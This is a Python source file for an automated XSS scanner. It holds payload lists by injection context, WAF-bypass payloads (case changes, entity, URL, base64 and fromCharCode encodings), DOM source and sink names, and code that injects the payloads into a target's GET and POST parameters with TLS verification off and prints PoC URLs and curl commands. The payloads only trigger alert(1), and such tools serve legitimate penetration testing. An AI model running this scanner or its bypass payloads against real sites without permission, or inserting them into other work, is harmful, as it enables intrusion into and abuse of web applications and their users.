#!/usr/bin/env python3
"""
XSS Vulnerability Scanner Module
Inspired by XSStrike, Dalfox, and other XSS detection tools
"""

import re
import html
import urllib.parse
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class XSSType(Enum):
    REFLECTED = "Reflected XSS"
    STORED = "Stored XSS"
    DOM = "DOM-based XSS"
    BLIND = "Blind XSS"


class InjectionContext(Enum):
    HTML_BODY = "HTML Body"
    HTML_ATTRIBUTE = "HTML Attribute"
    HTML_ATTRIBUTE_UNQUOTED = "Unquoted HTML Attribute"
    HTML_COMMENT = "HTML Comment"
    SCRIPT_BLOCK = "Script Block"
    SCRIPT_STRING = "Script String"
    STYLE_BLOCK = "Style Block"
    URL = "URL Context"
    EVENT_HANDLER = "Event Handler"


@dataclass
class XSSPayload:
    """XSS Payload definition"""
    payload: str
    context: InjectionContext
    description: str
    bypass_type: str = ""
    tags: List[str] = field(default_factory=list)


@dataclass
class XSSVulnerability:
    """Detected XSS vulnerability"""
    url: str
    parameter: str
    xss_type: XSSType
    context: InjectionContext
    payload: str
    evidence: str
    confidence: int  # 1-100
    severity: str = "HIGH"
    poc_url: str = ""


# Comprehensive XSS Payloads organized by context
XSS_PAYLOADS = {
    InjectionContext.HTML_BODY: [
        XSSPayload('<script>alert(1)</script>', InjectionContext.HTML_BODY, 'Basic script injection'),
        XSSPayload('<img src=x onerror=alert(1)>', InjectionContext.HTML_BODY, 'IMG tag error handler'),
        XSSPayload('<svg onload=alert(1)>', InjectionContext.HTML_BODY, 'SVG onload'),
        XSSPayload('<body onload=alert(1)>', InjectionContext.HTML_BODY, 'Body onload'),
        XSSPayload('<iframe src="javascript:alert(1)">', InjectionContext.HTML_BODY, 'Iframe javascript'),
        XSSPayload('<details open ontoggle=alert(1)>', InjectionContext.HTML_BODY, 'Details ontoggle'),
        XSSPayload('<marquee onstart=alert(1)>', InjectionContext.HTML_BODY, 'Marquee onstart'),
        XSSPayload('<video src=x onerror=alert(1)>', InjectionContext.HTML_BODY, 'Video error handler'),
        XSSPayload('<audio src=x onerror=alert(1)>', InjectionContext.HTML_BODY, 'Audio error handler'),
        XSSPayload('<input onfocus=alert(1) autofocus>', InjectionContext.HTML_BODY, 'Input autofocus'),
        XSSPayload('<select onfocus=alert(1) autofocus>', InjectionContext.HTML_BODY, 'Select autofocus'),
        XSSPayload('<textarea onfocus=alert(1) autofocus>', InjectionContext.HTML_BODY, 'Textarea autofocus'),
        XSSPayload('<keygen onfocus=alert(1) autofocus>', InjectionContext.HTML_BODY, 'Keygen autofocus'),
        XSSPayload('<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>', InjectionContext.HTML_BODY, 'MathML XSS'),
        XSSPayload('<object data="javascript:alert(1)">', InjectionContext.HTML_BODY, 'Object data javascript'),
        XSSPayload('<embed src="javascript:alert(1)">', InjectionContext.HTML_BODY, 'Embed javascript'),
        XSSPayload('<a href="javascript:alert(1)">click</a>', InjectionContext.HTML_BODY, 'Anchor javascript href'),
        XSSPayload('<form action="javascript:alert(1)"><input type=submit>', InjectionContext.HTML_BODY, 'Form action javascript'),
    ],
    InjectionContext.HTML_ATTRIBUTE: [
        XSSPayload('" onmouseover="alert(1)', InjectionContext.HTML_ATTRIBUTE, 'Double quote breakout'),
        XSSPayload("' onmouseover='alert(1)", InjectionContext.HTML_ATTRIBUTE, 'Single quote breakout'),
        XSSPayload('" onfocus="alert(1)" autofocus="', InjectionContext.HTML_ATTRIBUTE, 'Autofocus injection'),
        XSSPayload('" onclick="alert(1)"', InjectionContext.HTML_ATTRIBUTE, 'Onclick injection'),
        XSSPayload('"><script>alert(1)</script>', InjectionContext.HTML_ATTRIBUTE, 'Tag breakout script'),
        XSSPayload("'><script>alert(1)</script>", InjectionContext.HTML_ATTRIBUTE, 'Single quote tag breakout'),
        XSSPayload('" onload="alert(1)', InjectionContext.HTML_ATTRIBUTE, 'Onload injection'),
        XSSPayload('" onerror="alert(1)', InjectionContext.HTML_ATTRIBUTE, 'Onerror injection'),
    ],
    InjectionContext.SCRIPT_BLOCK: [
        XSSPayload('</script><script>alert(1)</script>', InjectionContext.SCRIPT_BLOCK, 'Script tag breakout'),
        XSSPayload('";alert(1);//', InjectionContext.SCRIPT_BLOCK, 'JS string breakout double'),
        XSSPayload("';alert(1);//", InjectionContext.SCRIPT_BLOCK, 'JS string breakout single'),
        XSSPayload('`-alert(1)-`', InjectionContext.SCRIPT_BLOCK, 'Template literal'),
        XSSPayload('\\"-alert(1)-//', InjectionContext.SCRIPT_BLOCK, 'Escape sequence'),
    ],
    InjectionContext.URL: [
        XSSPayload('javascript:alert(1)', InjectionContext.URL, 'Javascript protocol'),
        XSSPayload('data:text/html,<script>alert(1)</script>', InjectionContext.URL, 'Data URL'),
        XSSPayload('vbscript:alert(1)', InjectionContext.URL, 'VBScript protocol'),
    ],
    InjectionContext.EVENT_HANDLER: [
        XSSPayload('alert(1)', InjectionContext.EVENT_HANDLER, 'Direct event injection'),
        XSSPayload('alert`1`', InjectionContext.EVENT_HANDLER, 'Template literal call'),
        XSSPayload('(alert)(1)', InjectionContext.EVENT_HANDLER, 'Parenthesis call'),
        XSSPayload('[].map.call`${alert}1`', InjectionContext.EVENT_HANDLER, 'Array map call'),
    ],
}

# WAF bypass payloads
WAF_BYPASS_PAYLOADS = [
    XSSPayload('<ScRiPt>alert(1)</ScRiPt>', InjectionContext.HTML_BODY, 'Case variation', 'case'),
    XSSPayload('<script>alert(1)</script >', InjectionContext.HTML_BODY, 'Trailing space', 'whitespace'),
    XSSPayload('<script\t>alert(1)</script>', InjectionContext.HTML_BODY, 'Tab character', 'whitespace'),
    XSSPayload('<script\n>alert(1)</script>', InjectionContext.HTML_BODY, 'Newline', 'whitespace'),
    XSSPayload('<scr<script>ipt>alert(1)</scr</script>ipt>', InjectionContext.HTML_BODY, 'Double tag', 'nested'),
    XSSPayload('<img src=x onerror=alert(1)//', InjectionContext.HTML_BODY, 'No closing', 'malformed'),
    XSSPayload('<img src=x onerror=alert(1) ', InjectionContext.HTML_BODY, 'Dangling', 'malformed'),
    XSSPayload('<svg/onload=alert(1)>', InjectionContext.HTML_BODY, 'Slash instead of space', 'encoding'),
    XSSPayload('<IMG """><SCRIPT>alert(1)</SCRIPT>">', InjectionContext.HTML_BODY, 'Malformed IMG', 'malformed'),
    XSSPayload('<svg onload=alert(1)//>', InjectionContext.HTML_BODY, 'Comment close', 'comment'),
    XSSPayload('<<script>alert(1);//<</script>', InjectionContext.HTML_BODY, 'Double bracket', 'nested'),
    XSSPayload('<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">', InjectionContext.HTML_BODY, 'HTML entities', 'encoding'),
    XSSPayload('<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">', InjectionContext.HTML_BODY, 'Hex entities', 'encoding'),
    XSSPayload('<img src=x onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>', InjectionContext.HTML_BODY, 'Unicode escape', 'encoding'),
    XSSPayload('%3Cscript%3Ealert(1)%3C/script%3E', InjectionContext.HTML_BODY, 'URL encoded', 'encoding'),
    XSSPayload('%253Cscript%253Ealert(1)%253C/script%253E', InjectionContext.HTML_BODY, 'Double URL encoded', 'encoding'),
    XSSPayload('<script>eval(atob("YWxlcnQoMSk="))</script>', InjectionContext.HTML_BODY, 'Base64 encoded', 'encoding'),
    XSSPayload('<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>', InjectionContext.HTML_BODY, 'CharCode', 'encoding'),
]

# DOM XSS Sources and Sinks
DOM_SOURCES = [
    'document.URL',
    'document.documentURI',
    'document.URLUnencoded',
    'document.baseURI',
    'location',
    'location.href',
    'location.search',
    'location.hash',
    'location.pathname',
    'document.cookie',
    'document.referrer',
    'window.name',
    'history.pushState',
    'history.replaceState',
    'localStorage',
    'sessionStorage',
    'IndexedDB',
    'WebSQL',
]

DOM_SINKS = [
    'eval(',
    'setTimeout(',
    'setInterval(',
    'Function(',
    'document.write(',
    'document.writeln(',
    'innerHTML',
    'outerHTML',
    'insertAdjacentHTML',
    '.html(',  # jQuery
    'element.src',
    'element.href',
    'element.action',
    'element.formAction',
    'location.assign(',
    'location.replace(',
    'window.open(',
    'document.domain',
    'postMessage(',
    'execScript(',
    'msSetImmediate(',
    'Range.createContextualFragment(',
]


class XSSScanner:
    """XSS Vulnerability Scanner"""

    def __init__(self, timeout: int = 10, user_agent: str = None, proxy: str = None):
        self.timeout = timeout
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.session = self._create_session()
        self.vulnerabilities: List[XSSVulnerability] = []
        self.scan_marker = "XSS_SCAN_MARKER_7x7x7"

    def _create_session(self) -> requests.Session:
        """Create HTTP session with retry logic"""
        session = requests.Session()
        retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({"User-Agent": self.user_agent})
        return session

    def scan_url(self, url: str, method: str = "GET", data: Dict = None) -> List[XSSVulnerability]:
        """Scan URL for XSS vulnerabilities"""
        self.vulnerabilities = []

        # Parse URL and extract parameters
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params and not data:
            # Try to find forms and inputs
            params = self._discover_parameters(url)

        # Test each parameter
        for param in params:
            self._test_parameter(url, param, method, data)

        # Test POST data parameters
        if data:
            for param in data:
                self._test_parameter(url, param, "POST", data)

        # Check for DOM XSS
        dom_vulns = self._check_dom_xss(url)
        self.vulnerabilities.extend(dom_vulns)

        return self.vulnerabilities

    def _discover_parameters(self, url: str) -> Dict:
        """Discover parameters from page forms and links"""
        params = {}
        try:
            response = self.session.get(url, timeout=self.timeout, proxies=self.proxy, verify=False)
            content = response.text

            # Find form inputs
            input_pattern = r'<input[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*>'
            for match in re.finditer(input_pattern, content, re.IGNORECASE):
                params[match.group(1)] = ""

            # Find select fields
            select_pattern = r'<select[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*>'
            for match in re.finditer(select_pattern, content, re.IGNORECASE):
                params[match.group(1)] = ""

            # Find textarea fields
            textarea_pattern = r'<textarea[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*>'
            for match in re.finditer(textarea_pattern, content, re.IGNORECASE):
                params[match.group(1)] = ""

        except Exception:
            pass

        return params

    def _test_parameter(self, url: str, param: str, method: str, data: Dict = None):
        """Test a single parameter for XSS"""
        # First, detect injection context
        context = self._detect_context(url, param, method, data)

        # Get payloads for this context
        payloads = self._get_payloads_for_context(context)

        # Test each payload
        for payload_obj in payloads:
            result = self._inject_payload(url, param, payload_obj.payload, method, data)
            if result:
                vuln = XSSVulnerability(
                    url=url,
                    parameter=param,
                    xss_type=XSSType.REFLECTED,
                    context=context,
                    payload=payload_obj.payload,
                    evidence=result,
                    confidence=85,
                    poc_url=self._build_poc_url(url, param, payload_obj.payload)
                )
                self.vulnerabilities.append(vuln)
                break  # Found vulnerability, move to next parameter

        # Try WAF bypass payloads if standard payloads failed
        if not any(v.parameter == param for v in self.vulnerabilities):
            for payload_obj in WAF_BYPASS_PAYLOADS:
                result = self._inject_payload(url, param, payload_obj.payload, method, data)
                if result:
                    vuln = XSSVulnerability(
                        url=url,
                        parameter=param,
                        xss_type=XSSType.REFLECTED,
                        context=context,
                        payload=payload_obj.payload,
                        evidence=result,
                        confidence=80,
                        poc_url=self._build_poc_url(url, param, payload_obj.payload)
                    )
                    self.vulnerabilities.append(vuln)
                    break

    def _detect_context(self, url: str, param: str, method: str, data: Dict = None) -> InjectionContext:
        """Detect injection context by analyzing reflection"""
        marker = self.scan_marker

        try:
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param] = [marker]
                query = urllib.parse.urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                response = self.session.get(test_url, timeout=self.timeout, proxies=self.proxy, verify=False)
            else:
                test_data = (data or {}).copy()
                test_data[param] = marker
                response = self.session.post(url, data=test_data, timeout=self.timeout, proxies=self.proxy, verify=False)

            content = response.text

            if marker not in content:
                return InjectionContext.HTML_BODY

            # Find marker position and analyze context
            marker_pos = content.find(marker)
            before = content[max(0, marker_pos - 100):marker_pos]
            after = content[marker_pos:marker_pos + len(marker) + 100]

            # Check if inside script tag
            if re.search(r'<script[^>]*>[^<]*$', before, re.IGNORECASE):
                if "'" in before[-50:] or '"' in before[-50:]:
                    return InjectionContext.SCRIPT_STRING
                return InjectionContext.SCRIPT_BLOCK

            # Check if inside HTML attribute
            if re.search(r'<[a-z]+[^>]*[a-z]+\s*=\s*["\']?[^"\']*$', before, re.IGNORECASE):
                if "'" in before[-20:]:
                    return InjectionContext.HTML_ATTRIBUTE
                elif '"' in before[-20:]:
                    return InjectionContext.HTML_ATTRIBUTE
                return InjectionContext.HTML_ATTRIBUTE_UNQUOTED

            # Check if inside HTML comment
            if '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
                return InjectionContext.HTML_COMMENT

            # Check if inside style tag
            if re.search(r'<style[^>]*>[^<]*$', before, re.IGNORECASE):
                return InjectionContext.STYLE_BLOCK

            # Check if inside URL attribute
            if re.search(r'(href|src|action|data)\s*=\s*["\']?[^"\']*$', before, re.IGNORECASE):
                return InjectionContext.URL

            return InjectionContext.HTML_BODY

        except Exception:
            return InjectionContext.HTML_BODY

    def _get_payloads_for_context(self, context: InjectionContext) -> List[XSSPayload]:
        """Get appropriate payloads for injection context"""
        payloads = XSS_PAYLOADS.get(context, [])

        # Also include HTML_BODY payloads as fallback
        if context != InjectionContext.HTML_BODY:
            payloads = list(payloads) + XSS_PAYLOADS[InjectionContext.HTML_BODY][:5]

        return payloads

    def _inject_payload(self, url: str, param: str, payload: str, method: str, data: Dict = None) -> Optional[str]:
        """Inject payload and check for reflection"""
        try:
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param] = [payload]
                query = urllib.parse.urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                response = self.session.get(test_url, timeout=self.timeout, proxies=self.proxy, verify=False)
            else:
                test_data = (data or {}).copy()
                test_data[param] = payload
                response = self.session.post(url, data=test_data, timeout=self.timeout, proxies=self.proxy, verify=False)

            content = response.text

            # Check for unencoded reflection
            if payload in content:
                return f"Payload reflected unencoded: {payload[:50]}..."

            # Check for common XSS indicators
            indicators = [
                '<script>alert',
                'onerror=alert',
                'onload=alert',
                'javascript:alert',
                'onfocus=alert',
                'onclick=alert',
            ]

            for indicator in indicators:
                if indicator.lower() in content.lower():
                    return f"XSS indicator found: {indicator}"

            return None

        except Exception:
            return None

    def _check_dom_xss(self, url: str) -> List[XSSVulnerability]:
        """Check for potential DOM XSS"""
        vulnerabilities = []

        try:
            response = self.session.get(url, timeout=self.timeout, proxies=self.proxy, verify=False)
            content = response.text

            # Look for dangerous patterns
            for source in DOM_SOURCES:
                for sink in DOM_SINKS:
                    # Simple pattern matching for source -> sink flow
                    pattern = rf'{re.escape(source)}.*?{re.escape(sink)}'
                    if re.search(pattern, content, re.DOTALL | re.IGNORECASE):
                        vuln = XSSVulnerability(
                            url=url,
                            parameter="DOM",
                            xss_type=XSSType.DOM,
                            context=InjectionContext.SCRIPT_BLOCK,
                            payload=f"Source: {source} -> Sink: {sink}",
                            evidence=f"Potential DOM XSS: {source} flows to {sink}",
                            confidence=60,
                        )
                        vulnerabilities.append(vuln)
                        break

            # Check for direct innerHTML assignments from URL
            if re.search(r'innerHTML\s*=.*?(location|document\.URL|window\.name)', content, re.IGNORECASE):
                vuln = XSSVulnerability(
                    url=url,
                    parameter="DOM",
                    xss_type=XSSType.DOM,
                    context=InjectionContext.SCRIPT_BLOCK,
                    payload="innerHTML assignment from URL parameter",
                    evidence="innerHTML directly assigned from URL-controlled source",
                    confidence=75,
                )
                vulnerabilities.append(vuln)

            # Check for eval with URL input
            if re.search(r'eval\s*\([^)]*?(location|document\.URL|window\.name)', content, re.IGNORECASE):
                vuln = XSSVulnerability(
                    url=url,
                    parameter="DOM",
                    xss_type=XSSType.DOM,
                    context=InjectionContext.SCRIPT_BLOCK,
                    payload="eval() with URL-controlled input",
                    evidence="eval() using URL-controlled source",
                    confidence=80,
                )
                vulnerabilities.append(vuln)

        except Exception:
            pass

        return vulnerabilities

    def _build_poc_url(self, url: str, param: str, payload: str) -> str:
        """Build PoC URL with payload"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        query = urllib.parse.urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

    def generate_report(self) -> str:
        """Generate XSS scan report"""
        if not self.vulnerabilities:
            return "No XSS vulnerabilities found."

        report = []
        report.append("=" * 60)
        report.append("XSS VULNERABILITY SCAN REPORT")
        report.append("=" * 60)
        report.append(f"\nTotal vulnerabilities found: {len(self.vulnerabilities)}\n")

        for i, vuln in enumerate(self.vulnerabilities, 1):
            report.append(f"\n[{i}] {vuln.xss_type.value}")
            report.append("-" * 40)
            report.append(f"URL: {vuln.url}")
            report.append(f"Parameter: {vuln.parameter}")
            report.append(f"Context: {vuln.context.value}")
            report.append(f"Confidence: {vuln.confidence}%")
            report.append(f"Payload: {vuln.payload}")
            report.append(f"Evidence: {vuln.evidence}")
            if vuln.poc_url:
                report.append(f"PoC URL: {vuln.poc_url}")

        return "\n".join(report)

    def get_poc_commands(self) -> List[str]:
        """Generate PoC commands for found vulnerabilities"""
        commands = []
        for vuln in self.vulnerabilities:
            if vuln.poc_url:
                commands.append(f"# {vuln.xss_type.value} in parameter '{vuln.parameter}'")
                commands.append(f"curl -s '{vuln.poc_url}'")
                commands.append("")
        return commands


def quick_xss_scan(url: str) -> List[XSSVulnerability]:
    """Quick XSS scan of a URL"""
    scanner = XSSScanner()
    return scanner.scan_url(url)


def generate_xss_payloads(context: str = "all") -> List[str]:
    """Generate XSS payloads for testing"""
    payloads = []

    if context == "all" or context == "html":
        for p in XSS_PAYLOADS[InjectionContext.HTML_BODY]:
            payloads.append(p.payload)

    if context == "all" or context == "attribute":
        for p in XSS_PAYLOADS[InjectionContext.HTML_ATTRIBUTE]:
            payloads.append(p.payload)

    if context == "all" or context == "script":
        for p in XSS_PAYLOADS[InjectionContext.SCRIPT_BLOCK]:
            payloads.append(p.payload)

    if context == "all" or context == "bypass":
        for p in WAF_BYPASS_PAYLOADS:
            payloads.append(p.payload)

    return payloads


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python xss_scanner.py <url>")
        print("Example: python xss_scanner.py 'http://example.com/search?q=test'")
        sys.exit(1)

    target_url = sys.argv[1]
    print(f"Scanning {target_url} for XSS vulnerabilities...")

    scanner = XSSScanner()
    vulns = scanner.scan_url(target_url)

    print(scanner.generate_report())

    if vulns:
        print("\n" + "=" * 60)
        print("PoC Commands:")
        print("=" * 60)
        for cmd in scanner.get_poc_commands():
            print(cmd)
